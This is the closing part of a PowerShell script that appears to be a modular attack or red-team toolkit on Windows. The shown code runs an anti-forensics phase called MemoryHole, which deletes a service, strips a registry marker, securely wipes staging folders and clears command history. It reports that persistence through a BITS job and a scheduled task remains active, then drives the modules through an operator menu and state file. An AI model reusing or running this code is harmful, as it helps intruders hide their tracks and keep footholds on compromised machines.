    try { $ndis = Get-Service -Name "NdisFilterHelper" -ErrorAction SilentlyContinue; if ($ndis) { Stop-Service "NdisFilterHelper" -Force -ErrorAction SilentlyContinue; & sc.exe delete "NdisFilterHelper" 2>$null | Out-Null; Write-Success "WhosThere: NdisFilterHelper stopped and registration removed" } } catch {}
    try { $dp = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics"; if (Test-Path $dp) { Remove-ItemProperty -Path $dp -Name "TelemetryCoreVersion" -ErrorAction SilentlyContinue; Write-Success "ChocolateFactory telemetry marker removed" } } catch {}
    Write-Success "Registry cleanup done"

    # ── Phase K: Staging Dir Cleanup ──────────────────────────────────────────
    Write-Section "K/K  Staging Dir Cleanup"
    try { Get-Item "$env:TEMP\rt_*" -ErrorAction SilentlyContinue | ForEach-Object { if ($_.PSIsContainer) { Get-ChildItem -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.PSIsContainer } | ForEach-Object { _Remove-Secure $_.FullName }; Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue } else { _Remove-Secure $_.FullName } } } catch {}
    try { Get-Item "$env:TEMP\chocobuild_*" -ErrorAction SilentlyContinue | ForEach-Object { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue } } catch {}
    Write-Success "Staging dirs wiped"

    # Note: Phase L (self-deletion) is skipped in combined script context.

    Write-Host ""
    Write-Success "MemoryHole complete. Phase 2 persistence still ACTIVE (minus WhosThere service)."
    Write-Info "  BITS job (BackgroundBeef)    : still active — bitsadmin /list /allusers"
    Write-Info "  ChocolateFactory task         : still registered"
    Write-Info "  WhosThere                     : service stopped + registration removed"
    try { Clear-History -ErrorAction SilentlyContinue } catch {}
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

Show-Banner

# ── Status-only mode ──────────────────────────────────────────────────────────
if ($Status) {
    Show-Status
    exit 0
}

# ── Resolve module list ───────────────────────────────────────────────────────
$_nameAliases = @{
    "1" = "ServiceSmasher"; "servicesmasher" = "ServiceSmasher"; "service" = "ServiceSmasher"; "smasher" = "ServiceSmasher"
    "2" = "WhosThere";      "whosthere"      = "WhosThere";      "traffic" = "WhosThere";      "knock"   = "WhosThere"
    "3" = "BackgroundBeef"; "backgroundbeef" = "BackgroundBeef"; "bits"    = "BackgroundBeef"; "beef"    = "BackgroundBeef"
    "4" = "ChocolateFactory";"chocolatefactory"="ChocolateFactory";"choco" = "ChocolateFactory";"chocolate"="ChocolateFactory"
    "5" = "MemoryHole";     "memoryhole"     = "MemoryHole";     "memory"  = "MemoryHole";     "hole"    = "MemoryHole"
}

function Resolve-ModuleName {
    param([string]$Name)
    $key = $Name.ToLower().Trim()
    if ($_nameAliases.ContainsKey($key)) { return $_nameAliases[$key] }
    $match = $_ModuleOrder | Where-Object { $_.ToLower() -eq $key } | Select-Object -First 1
    if ($match) { return $match }
    return $null
}

function Run-Modules {
    param([string[]]$ToRun)

    # MemoryHole always sorts last
    $sorted = $_ModuleOrder | Where-Object { $ToRun -contains $_ }

    $state = Read-StateFile
    $summary = @()

    foreach ($m in $sorted) {
        $e = $state[$m]
        if ($Resume -and $e -and $e.Status -eq "SUCCESS") {
            Write-Info "[$m] Skipping — already SUCCESS (use -Force to re-run)"
            continue
        }
        if (-not $Force -and $e -and $e.Status -eq "SUCCESS") {
            $confirm = Read-Host "[$m] Already marked SUCCESS. Re-run? [y/N]"
            if ($confirm -notmatch '^[yY]') { continue }
        }

        # Config validation
        $cfgErrors = Test-OperatorConfig -TargetModules @($m)
        if ($cfgErrors.Count -gt 0) {
            Write-Err "[$m] Operator Config errors:"
            $cfgErrors | ForEach-Object { Write-Err "  $_" }
            $skip = Read-Host "  Skip $m and continue? [Y/n]"
            if ($skip -notmatch '^[nN]') {
                Set-ModuleState $m "SKIPPED" "Config not set"
                $summary += [pscustomobject]@{ Module=$m; Result="SKIPPED"; Reason="Config not set" }
                continue
            }
        }

        Write-Host ""
        Write-Host "  ► Running: $m" -ForegroundColor Cyan
        Set-ModuleState $m "RUNNING"
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            switch ($m) {
                "ServiceSmasher"   { Invoke-ServiceSmasher }
                "WhosThere"        { Invoke-WhosThere }
                "BackgroundBeef"   { Invoke-BackgroundBeef }
                "ChocolateFactory" { Invoke-ChocolateFactory }
                "MemoryHole"       { Invoke-MemoryHole }
            }
            $sw.Stop()
            $elapsed = [math]::Round($sw.Elapsed.TotalSeconds, 1)
            Set-ModuleState $m "SUCCESS" "${elapsed}s"
            $summary += [pscustomobject]@{ Module=$m; Result="SUCCESS"; Reason="${elapsed}s" }
            Write-Success "[$m] DONE  (${elapsed}s)"
        } catch {
            $sw.Stop()
            $errMsg = "$_"
            Set-ModuleState $m "FAILED" $errMsg
            $summary += [pscustomobject]@{ Module=$m; Result="FAILED"; Reason=$errMsg }
            Write-Err "[$m] FAILED: $errMsg"
        }
        $state = Read-StateFile
    }

    # Session summary
    Write-Host ""
    Write-Host "  ══ Session Summary ══════════════════════════════════" -ForegroundColor Cyan
    foreach ($r in $summary) {
        $col = switch ($r.Result) { "SUCCESS" { "Green" } "FAILED" { "Red" } default { "Yellow" } }
        Write-Host ("  {0,-7} {1,-18} {2}" -f $r.Result, $r.Module, $r.Reason) -ForegroundColor $col
    }
    Write-Host ""
}

# ── Non-interactive: -Modules or -All ────────────────────────────────────────
if ($All) {
    Run-Modules -ToRun $_ModuleOrder
    exit 0
}

if ($Modules.Count -gt 0) {
    $resolved = $Modules | ForEach-Object { Resolve-ModuleName $_ } | Where-Object { $_ }
    $invalid  = $Modules | Where-Object { -not (Resolve-ModuleName $_) }
    if ($invalid.Count -gt 0) { Write-Err "Unknown modules: $($invalid -join ', ')"; exit 1 }
    Run-Modules -ToRun $resolved
    exit 0
}

# ── Interactive menu loop ─────────────────────────────────────────────────────
while ($true) {
    $state = Read-StateFile
    Show-Menu -State $state

    $selection = Read-Host "  Selection"
    $selection = $selection.Trim()

    if ($selection -match '^[qQ]') {
        Write-Host ""
        Write-Host "  Exiting. State saved to: $StateFile" -ForegroundColor DarkGray
        Show-Status
        break
    }

    if ($selection -match '^[aA]') {
        Run-Modules -ToRun $_ModuleOrder
        continue
    }

    $tokens  = $selection -split '[,\s]+' | Where-Object { $_ }
    $resolved = $tokens | ForEach-Object { Resolve-ModuleName $_ } | Where-Object { $_ }
    $invalid  = $tokens | Where-Object { -not (Resolve-ModuleName $_) }

    if ($invalid.Count -gt 0) { Write-Warn "Unknown selection(s): $($invalid -join ', ')"; continue }
    if ($resolved.Count -eq 0) { Write-Warn "No valid modules selected"; continue }

    Run-Modules -ToRun $resolved
}
